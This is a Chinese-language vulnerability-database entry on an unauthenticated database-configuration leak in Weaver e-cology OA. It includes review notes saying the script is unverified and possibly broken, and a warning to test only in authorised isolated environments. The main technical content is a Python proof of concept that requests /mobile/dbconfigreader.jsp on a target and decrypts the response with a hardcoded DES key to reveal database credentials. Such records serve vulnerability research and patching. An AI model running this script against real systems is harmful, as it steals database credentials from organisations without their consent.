---
date: "Sun, 30 Aug 2020 04:06:36 +0000"
draft: false
tags: ['白阁-漏洞库']
title: "泛微e-cology DBconfigReader配置泄漏+DES解密脚本"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "已知8.100.0531，其余未排除"
prerequisites: "无凭证请求，部署限制未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source: "原收录资料；原始作者及出处待核实"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.md"
id: "vw-191c90b11f8c1c700620bcbf"
entity_id: "ve-191c90b11f8c1c700620bcbf"
schema_version: "1"
---

# 泛微e-cology DBconfigReader配置泄漏+DES解密脚本

## 条目说明

- 对象与具体问题：泛微e-cology；DBconfigReader配置泄漏+DES解密脚本
- 版本、配置及部署条件：已知8.100.0531，其余未排除
- 认证与权限前提：无凭证请求，部署限制未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- pyDes.setKey传12字符密钥而DES要求8字节，与Java DESKeySpec截取不同，脚本会失败需核对
- 路由dbconfigreader.jsp小写与其他DBconfigReader.jsp差异，依容器大小写不能直接等同可用
- 响应strip与Java丢前10字节不同，缺解释/原始数据/原文链接
- 仅一个脚本，合并DBconfigReader并保留格式差异待核

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

#### 影响版本

目前已知为8.100.0531，不排除其他版本，包括不限于EC7.0、EC8.0

#### 漏洞验证POC

```
# -*- coding:utf-8 -*-
#Author:print("")
import pyDes,requests
import sys
def desdecode(secret_key,s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y
default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}
def send(url):
    data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content
    return (desdecode('1z2x3c4v5b6n', data.strip()))

if __name__ == '__main__':
    url = sys.argv[1]
    print('泛微e-cology OA 数据库配置信息泄漏漏洞')
    print('url--->%s'%url)
    print('数据库信息如下----->:%s'%send(url)) 
```


---

> 来源：白阁文库 BaizeSec/bylibrary
